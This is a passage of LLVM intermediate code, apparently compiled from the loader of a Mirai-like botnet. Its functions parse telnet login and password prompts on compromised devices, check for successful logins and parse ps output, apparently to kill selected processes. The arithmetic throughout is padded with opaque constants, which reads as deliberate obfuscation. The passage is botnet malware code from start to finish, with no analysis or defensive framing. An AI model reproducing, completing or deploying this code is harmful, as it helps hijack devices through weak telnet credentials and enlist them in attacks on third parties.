  %10 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i32 0, i32 0
  %11 = load %struct.connection*, %struct.connection** %4, align 8
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %11, i32 0, i32 9
  %13 = load i16, i16* %12, align 8
  %14 = zext i16 %13 to i32
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %10, i64 %15
  store i8* %16, i8** %7, align 8
  %17 = load i8*, i8** %5, align 8
  %18 = load i32, i32* %6, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = load i8*, i8** %7, align 8
  %22 = icmp ult i8* %20, %21
  %23 = zext i1 %22 to i32
  %24 = trunc i32 %23 to i8
  ret i8 %24
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_login_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %63, %1
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %68

; <label>:15:                                     ; preds = %12
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  br i1 %23, label %60, label %24

; <label>:24:                                     ; preds = %15
  %25 = load %struct.connection*, %struct.connection** %3, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 15
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 62
  br i1 %32, label %60, label %33

; <label>:33:                                     ; preds = %24
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 15
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i64 0, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 36
  br i1 %41, label %60, label %42

; <label>:42:                                     ; preds = %33
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 15
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [8192 x i8], [8192 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 35
  br i1 %50, label %60, label %51

; <label>:51:                                     ; preds = %42
  %52 = load %struct.connection*, %struct.connection** %3, align 8
  %53 = getelementptr inbounds %struct.connection, %struct.connection* %52, i32 0, i32 15
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [8192 x i8], [8192 x i8]* %53, i64 0, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 37
  br i1 %59, label %60, label %62

; <label>:60:                                     ; preds = %51, %42, %33, %24, %15
  %61 = load i32, i32* %5, align 4
  store i32 %61, i32* %6, align 4
  br label %68

; <label>:62:                                     ; preds = %51
  br label %63

; <label>:63:                                     ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = sub i32 0, -1
  %66 = sub i32 %64, %65
  %67 = add nsw i32 %64, -1
  store i32 %66, i32* %5, align 4
  br label %12

; <label>:68:                                     ; preds = %60, %12
  %69 = load i32, i32* %6, align 4
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %97

; <label>:71:                                     ; preds = %68
  %72 = load %struct.connection*, %struct.connection** %3, align 8
  %73 = getelementptr inbounds %struct.connection, %struct.connection* %72, i32 0, i32 15
  %74 = getelementptr inbounds [8192 x i8], [8192 x i8]* %73, i32 0, i32 0
  %75 = load %struct.connection*, %struct.connection** %3, align 8
  %76 = getelementptr inbounds %struct.connection, %struct.connection* %75, i32 0, i32 9
  %77 = load i16, i16* %76, align 8
  %78 = zext i16 %77 to i32
  %79 = call i32 @util_memsearch(i8* %74, i32 %78, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i32 4)
  store i32 %79, i32* %7, align 4
  %80 = icmp ne i32 %79, -1
  br i1 %80, label %81, label %83

; <label>:81:                                     ; preds = %71
  %82 = load i32, i32* %7, align 4
  store i32 %82, i32* %6, align 4
  br label %96

; <label>:83:                                     ; preds = %71
  %84 = load %struct.connection*, %struct.connection** %3, align 8
  %85 = getelementptr inbounds %struct.connection, %struct.connection* %84, i32 0, i32 15
  %86 = getelementptr inbounds [8192 x i8], [8192 x i8]* %85, i32 0, i32 0
  %87 = load %struct.connection*, %struct.connection** %3, align 8
  %88 = getelementptr inbounds %struct.connection, %struct.connection* %87, i32 0, i32 9
  %89 = load i16, i16* %88, align 8
  %90 = zext i16 %89 to i32
  %91 = call i32 @util_memsearch(i8* %86, i32 %90, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i32 0, i32 0), i32 5)
  store i32 %91, i32* %7, align 4
  %92 = icmp ne i32 %91, -1
  br i1 %92, label %93, label %95

; <label>:93:                                     ; preds = %83
  %94 = load i32, i32* %7, align 4
  store i32 %94, i32* %6, align 4
  br label %95

; <label>:95:                                     ; preds = %93, %83
  br label %96

; <label>:96:                                     ; preds = %95, %81
  br label %97

; <label>:97:                                     ; preds = %96, %68
  %98 = load i32, i32* %6, align 4
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %101

; <label>:100:                                    ; preds = %97
  store i32 0, i32* %2, align 4
  br label %103

; <label>:101:                                    ; preds = %97
  %102 = load i32, i32* %6, align 4
  store i32 %102, i32* %2, align 4
  br label %103

; <label>:103:                                    ; preds = %101, %100
  %104 = load i32, i32* %2, align 4
  ret i32 %104
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_password_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %63, %1
  %13 = load i32, i32* %5, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %69

; <label>:15:                                     ; preds = %12
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = load i32, i32* %5, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 58
  br i1 %23, label %60, label %24

; <label>:24:                                     ; preds = %15
  %25 = load %struct.connection*, %struct.connection** %3, align 8
  %26 = getelementptr inbounds %struct.connection, %struct.connection* %25, i32 0, i32 15
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [8192 x i8], [8192 x i8]* %26, i64 0, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 62
  br i1 %32, label %60, label %33

; <label>:33:                                     ; preds = %24
  %34 = load %struct.connection*, %struct.connection** %3, align 8
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %34, i32 0, i32 15
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %35, i64 0, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 36
  br i1 %41, label %60, label %42

; <label>:42:                                     ; preds = %33
  %43 = load %struct.connection*, %struct.connection** %3, align 8
  %44 = getelementptr inbounds %struct.connection, %struct.connection* %43, i32 0, i32 15
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = getelementptr inbounds [8192 x i8], [8192 x i8]* %44, i64 0, i64 %46
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 35
  br i1 %50, label %60, label %51

; <label>:51:                                     ; preds = %42
  %52 = load %struct.connection*, %struct.connection** %3, align 8
  %53 = getelementptr inbounds %struct.connection, %struct.connection* %52, i32 0, i32 15
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [8192 x i8], [8192 x i8]* %53, i64 0, i64 %55
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 37
  br i1 %59, label %60, label %62

; <label>:60:                                     ; preds = %51, %42, %33, %24, %15
  %61 = load i32, i32* %5, align 4
  store i32 %61, i32* %6, align 4
  br label %69

; <label>:62:                                     ; preds = %51
  br label %63

; <label>:63:                                     ; preds = %62
  %64 = load i32, i32* %5, align 4
  %65 = sub i32 %64, -1759705823
  %66 = add i32 %65, -1
  %67 = add i32 %66, -1759705823
  %68 = add nsw i32 %64, -1
  store i32 %67, i32* %5, align 4
  br label %12

; <label>:69:                                     ; preds = %60, %12
  %70 = load i32, i32* %6, align 4
  %71 = icmp eq i32 %70, -1
  br i1 %71, label %72, label %85

; <label>:72:                                     ; preds = %69
  %73 = load %struct.connection*, %struct.connection** %3, align 8
  %74 = getelementptr inbounds %struct.connection, %struct.connection* %73, i32 0, i32 15
  %75 = getelementptr inbounds [8192 x i8], [8192 x i8]* %74, i32 0, i32 0
  %76 = load %struct.connection*, %struct.connection** %3, align 8
  %77 = getelementptr inbounds %struct.connection, %struct.connection* %76, i32 0, i32 9
  %78 = load i16, i16* %77, align 8
  %79 = zext i16 %78 to i32
  %80 = call i32 @util_memsearch(i8* %75, i32 %79, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i32 7)
  store i32 %80, i32* %7, align 4
  %81 = icmp ne i32 %80, -1
  br i1 %81, label %82, label %84

; <label>:82:                                     ; preds = %72
  %83 = load i32, i32* %7, align 4
  store i32 %83, i32* %6, align 4
  br label %84

; <label>:84:                                     ; preds = %82, %72
  br label %85

; <label>:85:                                     ; preds = %84, %69
  %86 = load i32, i32* %6, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %85
  store i32 0, i32* %2, align 4
  br label %91

; <label>:89:                                     ; preds = %85
  %90 = load i32, i32* %6, align 4
  store i32 %90, i32* %2, align 4
  br label %91

; <label>:91:                                     ; preds = %89, %88
  %92 = load i32, i32* %2, align 4
  ret i32 %92
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_prompt(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %7 = load %struct.connection*, %struct.connection** %3, align 8
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %7, i32 0, i32 9
  %9 = load i16, i16* %8, align 8
  %10 = zext i16 %9 to i32
  store i32 %10, i32* %5, align 4
  br label %11

; <label>:11:                                     ; preds = %62, %1
  %12 = load i32, i32* %5, align 4
  %13 = icmp sge i32 %12, 0
  br i1 %13, label %14, label %68

; <label>:14:                                     ; preds = %11
  %15 = load %struct.connection*, %struct.connection** %3, align 8
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %15, i32 0, i32 15
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %16, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 58
  br i1 %22, label %59, label %23

; <label>:23:                                     ; preds = %14
  %24 = load %struct.connection*, %struct.connection** %3, align 8
  %25 = getelementptr inbounds %struct.connection, %struct.connection* %24, i32 0, i32 15
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [8192 x i8], [8192 x i8]* %25, i64 0, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 62
  br i1 %31, label %59, label %32

; <label>:32:                                     ; preds = %23
  %33 = load %struct.connection*, %struct.connection** %3, align 8
  %34 = getelementptr inbounds %struct.connection, %struct.connection* %33, i32 0, i32 15
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [8192 x i8], [8192 x i8]* %34, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 36
  br i1 %40, label %59, label %41

; <label>:41:                                     ; preds = %32
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 15
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 35
  br i1 %49, label %59, label %50

; <label>:50:                                     ; preds = %41
  %51 = load %struct.connection*, %struct.connection** %3, align 8
  %52 = getelementptr inbounds %struct.connection, %struct.connection* %51, i32 0, i32 15
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [8192 x i8], [8192 x i8]* %52, i64 0, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 37
  br i1 %58, label %59, label %61

; <label>:59:                                     ; preds = %50, %41, %32, %23, %14
  %60 = load i32, i32* %5, align 4
  store i32 %60, i32* %6, align 4
  br label %68

; <label>:61:                                     ; preds = %50
  br label %62

; <label>:62:                                     ; preds = %61
  %63 = load i32, i32* %5, align 4
  %64 = add i32 %63, 1135213000
  %65 = add i32 %64, -1
  %66 = sub i32 %65, 1135213000
  %67 = add nsw i32 %63, -1
  store i32 %66, i32* %5, align 4
  br label %11

; <label>:68:                                     ; preds = %59, %11
  %69 = load i32, i32* %6, align 4
  %70 = icmp eq i32 %69, -1
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %68
  store i32 0, i32* %2, align 4
  br label %74

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* %6, align 4
  store i32 %73, i32* %2, align 4
  br label %74

; <label>:74:                                     ; preds = %72, %71
  %75 = load i32, i32* %2, align 4
  ret i32 %75
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_verify_login(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %5 = load %struct.connection*, %struct.connection** %3, align 8
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %5, i32 0, i32 15
  %7 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i32 0, i32 0
  %8 = load %struct.connection*, %struct.connection** %3, align 8
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %8, i32 0, i32 9
  %10 = load i16, i16* %9, align 8
  %11 = zext i16 %10 to i32
  %12 = call i32 @util_memsearch(i8* %7, i32 %11, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %12, i32* %4, align 4
  %13 = load i32, i32* %4, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %1
  store i32 0, i32* %2, align 4
  br label %18

; <label>:16:                                     ; preds = %1
  %17 = load i32, i32* %4, align 4
  store i32 %17, i32* %2, align 4
  br label %18

; <label>:18:                                     ; preds = %16, %15
  %19 = load i32, i32* %2, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_psoutput(%struct.connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.connection*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store %struct.connection* %0, %struct.connection** %3, align 8
  %16 = load %struct.connection*, %struct.connection** %3, align 8
  %17 = getelementptr inbounds %struct.connection, %struct.connection* %16, i32 0, i32 15
  %18 = getelementptr inbounds [8192 x i8], [8192 x i8]* %17, i32 0, i32 0
  store i8* %18, i8** %5, align 8
  %19 = load %struct.connection*, %struct.connection** %3, align 8
  %20 = getelementptr inbounds %struct.connection, %struct.connection* %19, i32 0, i32 15
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %20, i32 0, i32 0
  %22 = load %struct.connection*, %struct.connection** %3, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %22, i32 0, i32 9
  %24 = load i16, i16* %23, align 8
  %25 = zext i16 %24 to i32
  %26 = call i32 @util_memsearch(i8* %21, i32 %25, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i32 0, i32 0), i32 23)
  store i32 %26, i32* %4, align 4
  store i32 0, i32* %6, align 4
  br label %27

; <label>:27:                                     ; preds = %296, %1
  %28 = load i32, i32* %6, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, -1
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %27
  %32 = load %struct.connection*, %struct.connection** %3, align 8
  %33 = getelementptr inbounds %struct.connection, %struct.connection* %32, i32 0, i32 9
  %34 = load i16, i16* %33, align 8
  %35 = zext i16 %34 to i32
  br label %38

; <label>:36:                                     ; preds = %27
  %37 = load i32, i32* %4, align 4
  br label %38

; <label>:38:                                     ; preds = %36, %31
  %39 = phi i32 [ %35, %31 ], [ %37, %36 ]
  %40 = icmp slt i32 %28, %39
  br i1 %40, label %41, label %302

; <label>:41:                                     ; preds = %38
  %42 = load %struct.connection*, %struct.connection** %3, align 8
  %43 = getelementptr inbounds %struct.connection, %struct.connection* %42, i32 0, i32 15
  %44 = load i32, i32* %6, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [8192 x i8], [8192 x i8]* %43, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 13
  br i1 %49, label %50, label %56

; <label>:50:                                     ; preds = %41
  %51 = load %struct.connection*, %struct.connection** %3, align 8
  %52 = getelementptr inbounds %struct.connection, %struct.connection* %51, i32 0, i32 15
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [8192 x i8], [8192 x i8]* %52, i64 0, i64 %54
  store i8 0, i8* %55, align 1
  br label %295

; <label>:56:                                     ; preds = %41
  %57 = load %struct.connection*, %struct.connection** %3, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %57, i32 0, i32 15
  %59 = load i32, i32* %6, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [8192 x i8], [8192 x i8]* %58, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = zext i8 %62 to i32
  %64 = icmp eq i32 %63, 10
  br i1 %64, label %65, label %294

; <label>:65:                                     ; preds = %56
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  store i8* null, i8** %10, align 8
  store i8* null, i8** %11, align 8
  %66 = load %struct.connection*, %struct.connection** %3, align 8
  %67 = getelementptr inbounds %struct.connection, %struct.connection* %66, i32 0, i32 15
  %68 = load i32, i32* %6, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [8192 x i8], [8192 x i8]* %67, i64 0, i64 %69
  store i8 0, i8* %70, align 1
  store i32 0, i32* %7, align 4
  br label %71

; <label>:71:                                     ; preds = %163, %65
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = load %struct.connection*, %struct.connection** %3, align 8
  %75 = getelementptr inbounds %struct.connection, %struct.connection* %74, i32 0, i32 15
  %76 = load i32, i32* %6, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds [8192 x i8], [8192 x i8]* %75, i64 0, i64 %77
  %79 = load i8*, i8** %5, align 8
  %80 = ptrtoint i8* %78 to i64
  %81 = ptrtoint i8* %79 to i64
  %82 = sub i64 %80, -5646203628061379411
  %83 = sub i64 %82, %81
  %84 = add i64 %83, -5646203628061379411
  %85 = sub i64 %80, %81
  %86 = icmp slt i64 %73, %84
  br i1 %86, label %87, label %168

; <label>:87:                                     ; preds = %71
  %88 = load i8*, i8** %5, align 8
  %89 = load i32, i32* %7, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds i8, i8* %88, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %93, 32
  br i1 %94, label %111, label %95

; <label>:95:                                     ; preds = %87
  %96 = load i8*, i8** %5, align 8
  %97 = load i32, i32* %7, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = sext i8 %100 to i32
  %102 = icmp eq i32 %101, 9
  br i1 %102, label %111, label %103

; <label>:103:                                    ; preds = %95
  %104 = load i8*, i8** %5, align 8
  %105 = load i32, i32* %7, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = sext i8 %108 to i32
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %129

; <label>:111:                                    ; preds = %103, %95, %87
  %112 = load i8, i8* %8, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp sgt i32 %113, 0
  br i1 %114, label %115, label %124

; <label>:115:                                    ; preds = %111
  %116 = load i8, i8* %9, align 1
  %117 = icmp ne i8 %116, 0
  br i1 %117, label %124, label %118

; <label>:118:                                    ; preds = %115
  %119 = load i8, i8* %8, align 1
  %120 = add i8 %119, 79
  %121 = add i8 %120, 1
  %122 = sub i8 %121, 79
  %123 = add i8 %119, 1
  store i8 %122, i8* %8, align 1
  br label %124

; <label>:124:                                    ; preds = %118, %115, %111
  %125 = load i8*, i8** %5, align 8
  %126 = load i32, i32* %7, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %125, i64 %127
  store i8 0, i8* %128, align 1
  store i8 1, i8* %9, align 1
  br label %162

; <label>:129:                                    ; preds = %103
  %130 = load i8, i8* %8, align 1
  %131 = zext i8 %130 to i32
  %132 = icmp eq i32 %131, 0
  br i1 %132, label %133, label %143

; <label>:133:                                    ; preds = %129
  %134 = load i8*, i8** %5, align 8
  %135 = load i32, i32* %7, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i8, i8* %134, i64 %136
  store i8* %137, i8** %10, align 8
  %138 = load i8, i8* %8, align 1
  %139 = sub i8 %138, 109
  %140 = add i8 %139, 1
  %141 = add i8 %140, 109
  %142 = add i8 %138, 1
  store i8 %141, i8* %8, align 1
  br label %161

; <label>:143:                                    ; preds = %129
  %144 = load i8, i8* %8, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp sge i32 %145, 3
  br i1 %146, label %147, label %160

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* %8, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp sle i32 %149, 5
  br i1 %150, label %151, label %160

; <label>:151:                                    ; preds = %147
  %152 = load i8, i8* %9, align 1
  %153 = sext i8 %152 to i32
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %155, label %160

; <label>:155:                                    ; preds = %151
  %156 = load i8*, i8** %5, align 8
  %157 = load i32, i32* %7, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i8, i8* %156, i64 %158
  store i8* %159, i8** %11, align 8
  br label %160

; <label>:160:                                    ; preds = %155, %151, %147, %143
  br label %161

; <label>:161:                                    ; preds = %160, %133
  store i8 0, i8* %9, align 1
  br label %162

; <label>:162:                                    ; preds = %161, %124
  br label %163

; <label>:163:                                    ; preds = %162
  %164 = load i32, i32* %7, align 4
  %165 = sub i32 0, 1
  %166 = sub i32 %164, %165
  %167 = add nsw i32 %164, 1
  store i32 %166, i32* %7, align 4
  br label %71

; <label>:168:                                    ; preds = %71
  %169 = load i8*, i8** %10, align 8
  %170 = icmp ne i8* %169, null
  br i1 %170, label %171, label %286

; <label>:171:                                    ; preds = %168
  %172 = load i8*, i8** %11, align 8
  %173 = icmp ne i8* %172, null
  br i1 %173, label %174, label %286

; <label>:174:                                    ; preds = %171
  %175 = load i8*, i8** %10, align 8
  %176 = call i32 @atoi(i8* %175) #6
  store i32 %176, i32* %12, align 4
  %177 = load i8*, i8** %11, align 8
  %178 = call i64 @strlen(i8* %177) #6
  %179 = trunc i64 %178 to i32
  store i32 %179, i32* %13, align 4
  %180 = load i32, i32* %12, align 4
  %181 = icmp ne i32 %180, 1
  br i1 %181, label %182, label %196

; <label>:182:                                    ; preds = %174
  %183 = load i8*, i8** %11, align 8
  %184 = call i32 @strcmp(i8* %183, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0)) #6
  %185 = icmp eq i32 %184, 0
  br i1 %185, label %190, label %186

; <label>:186:                                    ; preds = %182
  %187 = load i8*, i8** %11, align 8
  %188 = call i32 @strcmp(i8* %187, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0)) #6
  %189 = icmp eq i32 %188, 0
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %186, %182
  %191 = load %struct.connection*, %struct.connection** %3, align 8
  %192 = getelementptr inbounds %struct.connection, %struct.connection* %191, i32 0, i32 4
  %193 = load i32, i32* %192, align 8
  %194 = load i32, i32* %12, align 4
  %195 = call signext i8 (i32, i8*, ...) @util_sockprintf(i32 %193, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.11, i32 0, i32 0), i32 %194)
  br label %285

; <label>:196:                                    ; preds = %186, %174
  %197 = load i32, i32* %12, align 4
  %198 = icmp sgt i32 %197, 400
  br i1 %198, label %199, label %284

; <label>:199:                                    ; preds = %196
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %7, align 4
  br label %200

; <label>:200:                                    ; preds = %266, %199
  %201 = load i32, i32* %7, align 4
  %202 = load i32, i32* %13, align 4
  %203 = icmp slt i32 %201, %202
  br i1 %203, label %204, label %271

; <label>:204:                                    ; preds = %200
  %205 = load i8*, i8** %11, align 8
  %206 = load i32, i32* %7, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i8, i8* %205, i64 %207
  %209 = load i8, i8* %208, align 1
  %210 = sext i8 %209 to i32
  %211 = icmp sge i32 %210, 48
  br i1 %211, label %212, label %226

; <label>:212:                                    ; preds = %204
  %213 = load i8*, i8** %11, align 8
  %214 = load i32, i32* %7, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds i8, i8* %213, i64 %215
  %217 = load i8, i8* %216, align 1
  %218 = sext i8 %217 to i32
  %219 = icmp sle i32 %218, 57
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %212
  %221 = load i32, i32* %14, align 4
  %222 = sub i32 %221, -760339858
  %223 = add i32 %222, 1
  %224 = add i32 %223, -760339858
  %225 = add nsw i32 %221, 1
  store i32 %224, i32* %14, align 4
  br label %265

; <label>:226:                                    ; preds = %212, %204
  %227 = load i8*, i8** %11, align 8
  %228 = load i32, i32* %7, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds i8, i8* %227, i64 %229
  %231 = load i8, i8* %230, align 1
  %232 = sext i8 %231 to i32
  %233 = icmp sge i32 %232, 97
  br i1 %233, label %234, label %242

; <label>:234:                                    ; preds = %226
  %235 = load i8*, i8** %11, align 8
  %236 = load i32, i32* %7, align 4
  %237 = sext i32 %236 to i64
  %238 = getelementptr inbounds i8, i8* %235, i64 %237
  %239 = load i8, i8* %238, align 1
  %240 = sext i8 %239 to i32
  %241 = icmp sle i32 %240, 122
